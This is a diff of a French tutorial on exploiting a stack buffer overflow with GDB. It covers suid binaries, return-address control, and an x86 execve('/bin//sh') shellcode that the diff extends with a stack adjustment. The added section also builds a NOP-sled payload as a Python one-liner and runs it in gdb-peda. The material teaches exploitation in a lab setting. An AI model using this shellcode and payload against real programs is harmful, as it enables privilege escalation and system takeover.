@@ -18,7 +18,7 @@ Un "buffer" en programmation est une mémoire-tampon permettant de stocker tempo
 ![buffer](/img/buffer.jpg)
 
 ***Mais... c'est quoi ce truc à la fin de mon buffer ?***\
-"\x00", ça ? **le null byte de fin de chaîne** et le "\x" permet d'indiquer une valeur he**x**adécimale. Cet octet nul sert tout simplement à indiquer que c'est la fin de la chaîne de caractères. Il est utilisé pour savoir quand il faut s'arrêter de lire en mémoire. La fonction d'impression l'a utilisée pour afficher le texte "Julien" à l'écran. Sans ce caractère nul, la fonction serait incapable de savoir quand est la fin du texte et elle continuerait à lire la suite.
+"\x00", ça ? **le null byte de fin de chaîne**, et le "\x" permet d'indiquer une valeur he**x**adécimale. Cet octet nul sert tout simplement à indiquer que c'est la fin de la chaîne de caractères. Il est utilisé pour savoir quand il faut s'arrêter de lire en mémoire. La fonction d'impression l'a utilisée pour afficher le texte "Julien" à l'écran. Sans ce caractère nul, la fonction serait incapable de savoir quand est la fin du texte et elle continuerait à lire la suite.
 
 Et voilà..... Ah oui, j'ai failli oublier! Le "overflow" maintenant :)\
 "Overflow" c'est le fait de déborder ce buffer et d'aller écrire en dehors de l'espace réservé à la base. De ce fait, des valeurs vont être écrasées et potentiellement provoquer des comportements anormaux voire un crash de l'application !
@@ -36,7 +36,7 @@ L'objectif c'est de dévier le flux d'exécution du programme et de pouvoir exé
 ***Je ferme l'application et j'exécute directement les commandes que je veux, pourquoi s'embêter ?***\
 Parce que vous n'avez pas forcément les droits nécessaires :p Sur une machine, il y a des services qui peuvent tourner avec des privilèges élevés ou alors des binaires possédant le flag "suid" et là prendre le contrôle d'une telle application devient nettement plus intéressant.
 
-Le flag "suid" pour "Set User ID", est un moyen de transferer des droits à un utilisateur sur un système Unix. Il s'agit d'un bit de contrôle applicable aux fichiers et permettant de lancer un programme en tant que l'utilisateur qui possède le fichier et non en tant que celui qui lance le fichier. Certains programmes ont besoin de posséder des droits supplémentaires et le flag "suid" peut être la solution.
+Le flag "suid" pour "Set User ID", est un moyen de transférer des droits à un utilisateur sur un système Unix. Il s'agit d'un bit de contrôle applicable aux fichiers et permettant de lancer un programme en tant que l'utilisateur qui possède le fichier et non en tant que celui qui lance le fichier. Certains programmes ont besoin de posséder des droits supplémentaires et le flag "suid" peut être la solution.
 
 ![suid](/img/suid.jpg)
 
@@ -46,7 +46,7 @@ Quelques exemples motivant un attaquant à exploiter un buffer overflow :
 
 - Un service en écoute sur un port est vulnérable à un buffer overflow. Un attaquant souhaite prendre le contrôle à distance sur ce serveur (dans un premier temps). Pour cela il va forger une requête particulière afin d'exploiter le buffer overflow en exécutant un code arbitraire qui va lui permettant d'obtenir un reverse shell (un shell inversé).
 - Cette fois, l'attaquant à la main sur la machine mais ne possède pas les pleins pouvoirs. Pour les obtenir, il va exploiter un programme vulnérable à un buffer overflow et qui tourne avec des privilèges élevés afin d'obtenir un shell possédant les pleins pouvoirs.
-- Maintenant aucun service n'est vulnérable et l'attaquant n'a pas la main sur la machine. Dans un premier temps, il va utiliser de l'ingénierie sociale (manipulation de l'être humain) pour réussir à faire télécharger un fichier à sa victime. Ensuite, un buffer overflow peut être exploité par l'un des logiciels de lectures du fichier (lecteur vidéo, photo, PDF, musique...) et l'attaquant pourra obtenir un reverse shell au moment où sa victime ouvrira le fichier. Ce genre de failles ont été présentes dans certaines versions de Adobe Reader (le lecteur de PDF).
+- Maintenant aucun service n'est vulnérable et l'attaquant n'a pas la main sur la machine. Dans un premier temps, il va utiliser de l'ingénierie sociale (manipulation de l'être humain) pour réussir à faire télécharger un fichier à sa victime. Ensuite, un buffer overflow peut être exploité par l'un des logiciels de lectures du fichier (lecteur vidéo, photo, PDF, musique...) et l'attaquant pourra obtenir un reverse shell au moment où sa victime ouvrira le fichier. Ce genre de faille ont été présentes dans certaines versions de Adobe Reader (le lecteur de PDF).
 
 Vous voyez qu'il y a un intérêt à exploiter un buffer overflow :) Let's go ??
 
@@ -90,17 +90,17 @@ Pour commencer, toutes les commandes GDB possèdent une version longue et courte
 
 | Commande                                   | Version courte  | Description                                                                                                                                                                                              |
 |--------------------------------------------|-----------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
-| ```run```                                  | ```r```         | Démarrer le programme.                                                                                                                                                                                   |
-| ```info functions```                       | ```i fu```      | Afficher la liste des fonctions.                                                                                                                                                                         |
-| ```break *0x... ou break *function_name``` | ```b *0x...```  | Pose un point d'arrêt à une ligne définie par son adresse ou au début d'une fonction.                                                                                                                    |
-| ```display/[quantité][type]x *0x...```     | ```x/...```     | Affiche une zone mémoire à partir de son adresse ou du nom d'une fonction. Type : 'w' 32 bits, 'b' 8 bits...                                                                                             |
-| ```next [n]```                             | ```ni [n]```    | Exécute [n] instruction(s). Par défaut, [n] est à 1. Vous pouvez donc faire "ni" directement.                                                                                                            |
-| ```step```                                 | ```si [n]```    | Pareil que "next". La différence ici c'est qu'on entre dans les fonctions.                                                                                                                               |
-| ```disassemble [a]```                      | ```disas [a]``` | Désassembler une zone spécifique de la mémoire (affichage du code assembleur). [a] est l'une des adresses de cette zone ou le nom d'une fonction. Par défaut, [a] est la fonction exécutée actuellement. | 
-| ```info break```                           | ```i b```       | Affiche la liste des points d'arrêt. | 
-| ```delete [n]```                           | ```d [n]```     | Supprime le [n] point d'arrêt. Si pas de numéro, supprime la totalité des points d'arrêt. |
-| ```pattern_create [n]```                   |                 | Génère un schéma facilement reconnaissable en mémoire de [n] caractères. |
-| ```pattern_search```                       |                 | Recherche le schéma précédemment généré en mémoire. |
+| `run`                                  | r         | Démarrer le programme.                                                                                                                                                                                   |
+| `info functions`                       | i fu      | Afficher la liste des fonctions.                                                                                                                                                                         |
+| `break *0x... ou break *function_name` | b *0x...  | Pose un point d'arrêt à une ligne définie par son adresse ou au début d'une fonction.                                                                                                                    |
+| `display/[quantité][type]x *0x...`     | x/...     | Affiche une zone mémoire à partir de son adresse ou du nom d'une fonction. Type : 'w' 32 bits, 'b' 8 bits...                                                                                             |
+| `next [n]`                             | ni [n]    | Exécute [n] instruction(s). Par défaut, [n] est à 1. Vous pouvez donc faire "ni" directement.                                                                                                            |
+| `step`                                 | si [n]    | Pareil que "next". La différence ici c'est qu'on entre dans les fonctions.                                                                                                                               |
+| `disassemble [a]`                      | disas [a] | Désassembler une zone spécifique de la mémoire (affichage du code assembleur). [a] est l'une des adresses de cette zone ou le nom d'une fonction. Par défaut, [a] est la fonction exécutée actuellement. | 
+| `info break`                           | i b       | Affiche la liste des points d'arrêt. | 
+| `delete [n]`                           | d [n]     | Supprime le [n] point d'arrêt. Si pas de numéro, supprime la totalité des points d'arrêt. |
+| `pattern_create [n]`                   |                 | Génère un schéma facilement reconnaissable en mémoire de [n] caractères. |
+| `pattern_search`                       |                 | Recherche le schéma précédemment généré en mémoire. |
 
 Pour avoir la liste complète des commandes, les différents types d'affichages, etc... c'est par ici :\
 https://sourceware.org/gdb/onlinedocs/gdb/
@@ -208,7 +208,7 @@ Nous allons lister les fonctions présentes afin d'y voir plus clair :
 
 ***Mais... il y en a beaucoup pour un simple programme !***\
 Toutes les fonctions commençant par un underscore ou finissants par "@plt" ne sont souvent pas des fonctions développées par le développeur du programme. C'est des fonctions présentes dans des bibliothèques partagées ou qui ont été rajoutées par le compilateur permettant d'initialiser le programme ou de le fermer proprement. Du coup ça en élimine plusieurs. Les fonctions "...register...clones" et "frame_dummy" peuvent également être ignorées.\
-Bon aller, voici une commande permettant d'afficher uniquement les fonctions ne commençant pas par un underscore et ne possédant pas de "@" :
+Bon allez, voici une commande permettant d'afficher uniquement les fonctions ne commençant pas par un underscore et ne possédant pas de "@" :
 
 ![gdb_functions_filter](/img/gdb_functions_filter.jpg)
 
@@ -272,22 +272,23 @@ Contrôler le flux d'exécution en modifiant le registre EIP c'est une chose, ou
 Une suite d'instructions sous forme de chaîne de caractères est appelé un **shellcode**. À l'origine, un shellcode était destiné à ouvrir un shell. Avec le temps, le mot s'est généralisé et maintenant nous l'employons pour désigner tout code malveillant (pas seulement l'ouverture d'un shell). Vous vous souvenez de la notation "\x" pour écrire un caractère en hexadécimal ? Nous allons en avoir besoin pour notre shellcode.\
 Je vous propose celui-ci :
 
-`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80`
+`\x83\xC4\x32\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80`
 
 Nous allons devoir utiliser un langage de programmation tel que Python pour interpréter notre shellcode. C'est-à-dire que chaque valeur hexadécimale va devoir être convertie en caractère. Par exemple, \x41 => "A".\
 Tout d'abord, essayons de comprendre ce shellcode :
 
 ```
-0:  31 c0                   xor    eax,eax     ; eax = 0
-2:  50                      push   eax         ; pousse eax sur la pile
-3:  68 2f 2f 73 68          push   0x68732f2f  ; pousse "//sh"
-8:  68 2f 62 69 6e          push   0x6e69622f  ; pousse "/bin"
-d:  89 e3                   mov    ebx,esp     ; adresse du haut de la pile dans ebx
-f:  50                      push   eax         ; pousse eax
-10: 53                      push   ebx         ; pousse ebx
-11: 89 e1                   mov    ecx,esp     ; adresse du haut de la pile dans ecx
-13: b0 0b                   mov    al,0xb      ; eax = 0xb (11) => id execve
-15: cd 80                   int    0x80        ; déclenche un syscall (appel système)
+0:  83 c4 32                add    esp,0x32    ; esp = esp + 50
+3:  31 c0                   xor    eax,eax     ; eax = 0
+5:  50                      push   eax         ; pousse eax sur la pile
+6:  68 2f 2f 73 68          push   0x68732f2f  ; pousse "//sh"
+b:  68 2f 62 69 6e          push   0x6e69622f  ; pousse "/bin"
+10: 89 e3                   mov    ebx,esp     ; adresse du haut de la pile dans ebx
+12: 50                      push   eax         ; pousse eax
+13: 53                      push   ebx         ; pousse ebx
+14: 89 e1                   mov    ecx,esp     ; adresse du haut de la pile dans ecx
+16: b0 0b                   mov    al,0xb      ; eax = 0xb (11) => id execve
+18: cd 80                   int    0x80        ; déclenche un syscall (appel système)
 ```
 
 ***Le site qui m'a permis de convertir le shellode en assembleur est [defuse.ca](https://defuse.ca/online-x86-assembler.htm).\
@@ -304,6 +305,46 @@ Les informations nécessaires pour réaliser un syscall peuvent être trouvées 
 ### Écriture de l'exploit
 
 - Nous savons que pour écrire le registre EIP, il faut atteindre le **44ème caractère**.
-- Nous avons en notre possession **un shellcode de 23 octets**.
+- Nous avons en notre possession **un shellcode de 26 octets**.
 
-Si nous plaçons notre shellcode au début de notre payload (charge qui va être injectée au moment de rentrer le prénom), alors il va falloir rajouter 21 caractères (44 - 23) pour atteindre l'adresse de retour sur la pile. L'adresse de retour va devoir pointer sur notre shellcode présent sur la pile. Ce schéma illustre la forme de notre charge finale :
+Si nous plaçons notre shellcode au début de notre payload (charge qui va être injectée au moment de rentrer le prénom), alors il va falloir rajouter **18 caractères (44 - 26) pour atteindre l'adresse de retour**. Cette dernière va devoir pointer sur notre shellcode présent sur la pile.
+
+Pour éviter d'avoir à mettre exactement l'adresse de notre shellcode, nous allons utiliser une petite astuce. Plutôt que de rajouter 18 caractères inutiles après notre shellcode (obligatoire pour atteindre l'adresse de retour), nous allons les utiliser à bons escients.\
+On va rajouter 18 instructions "nop" (ne fait aucune action) avant notre shellcode. Comme ça, il nous suffira simplement de mettre une adresse tombant dans cette suite de "nop" et par la suite notre shellcode sera exécuté.
+
+La valeur hexadécimale d'un nop est "\x90". Ce schéma illustre la forme de notre charge finale :
+
+![overflow exploit](/img/overflow_exploit.jpg)
+
+En Python, cela donnerait :
+
+`
+print "\x90"*18 + "\x83\xC4\x32\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "pool_address"
+`
+
+Pour calculer l'adresse du pool, il suffit simplement de récupérer l'adresse du haut de la pile au moment du "ret" et d'enlever 44 (0x2c).
+
+![overflow pool address](/img/overflow_pool_address.jpg)
+
+Pour être tranquille, je ne vais pas prendre exactement le début du pool mais un peu après. Ma charge finale donne donc :
+
+`
+print "\x90"*18 + "\x83\xC4\x32\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\xf5\xc4\xff\xff"
+`
+
+Maintenant nous pouvons supprimer les breakpoints et relancer le programme en injectant notre charge en input. Pour faire cela avec GDB, il suffit de faire :
+
+```
+gdb-peda$ d
+gdb-peda$ r < <(python -c 'print "\x90"*18 + "\x83\xC4\x32\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\xf5\xc4\xff\xff"')
+```
+
+![gdb run payload](/img/gdb_run_payload.jpg)
+
+Félicitations à vous !
+
+***Je n'ai pas compris pourquoi nous avions dû inverser l'ordre des octets pour l'adresse du pool...***\
+Effectivement, je n'ai pas donné d'explication sur cette inversion. En informatique, il y a deux façons d'écrire une adresse et on appelle cela l'[endianness](https://fr.wikipedia.org/wiki/Endianness). Les architectures de processeurs utilisent l'une ou l'autre :
+
+- Big endian : l'ordre des octets sont de gauche à droite (octets de poids fort au poids faible). Par exemple `0xA0B70708` => `A0 B7 07 08`.
+- Little endian : l'ordre des octets sont de droite à gauche (octets de poids faible au poids fort). Par exemple `0xA0B70708` => `08 07 B7 A0`. C'est cet ordre qui est **utilisé par les architectures X86**.
